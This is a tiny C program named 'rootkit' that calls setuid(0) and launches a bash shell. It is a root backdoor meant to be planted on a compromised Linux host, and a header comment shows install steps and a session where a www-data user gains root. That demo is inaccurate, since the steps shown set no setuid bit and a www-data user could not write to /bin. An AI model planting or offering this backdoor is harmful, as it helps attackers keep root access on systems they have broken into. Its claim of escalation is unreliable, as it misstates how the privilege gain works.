/*
gcc rootkit.c -o rootkit
chmod +x rootkit
mv rootkit /bin/rootkit
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ rootkit
# id
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    if (setuid(0)) {
        perror("setuid");
        return 1;
    }
    system("/bin/bash");
    return 0;
}
